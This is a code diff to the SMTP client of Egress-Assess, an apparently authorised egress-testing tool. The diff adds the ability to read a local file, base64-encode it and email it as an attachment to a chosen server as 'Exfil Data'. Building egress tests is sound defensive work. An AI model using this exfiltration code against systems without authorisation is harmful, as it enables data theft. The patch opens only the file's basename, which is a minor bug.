@@ -7,7 +7,10 @@ http://pymotw.com/2/smtpd/
 
 import smtplib
 import email.utils
+from email import Encoders
+from email.MIMEBase import MIMEBase
 from email.mime.text import MIMEText
+from email.MIMEMultipart import MIMEMultipart
 
 
 class Client:
@@ -20,6 +23,13 @@ class Client:
     def __init__(self, cli_object):
         self.protocol = "smtp"
         self.remote_server = cli_object.ip
+        if cli_object.file is None:
+            self.file_transfer = False
+        else:
+            if "/" in cli_object.file:
+                self.file_transfer = cli_object.file.split("/")[-1]
+            else:
+                self.file_transfer = cli_object.file
 
     # transmit is the only required function within the object.  It is what
     # called by the framework to transmit data.  However, you can create as 
@@ -30,11 +40,23 @@ class Client:
 
         print "[*] Sending data over e-mail..."
 
-        # Create the message
-        msg = MIMEText('This is the data to exfil:\n\n' + data_to_transmit)
-        msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
-        msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
-        msg['Subject'] = 'Egress-Assess Exfil Data'
+        if not self.file_transfer:
+            # Create the message
+            msg = MIMEText('This is the data to exfil:\n\n' + data_to_transmit)
+            msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
+            msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
+            msg['Subject'] = 'Egress-Assess Exfil Data'
+        else:
+            msg = MIMEMultipart()
+            msg['Subject'] = 'Egress-Assess Exfil Data'
+            msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
+            msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
+
+            part = MIMEBase('application', "octet-stream")
+            part.set_payload(open(self.file_transfer, "rb").read())
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 'attachment; filename=' + self.file_transfer)
+            msg.attach(part)
 
         server = smtplib.SMTP(self.remote_server, 25)
         server.set_debuglevel(False)
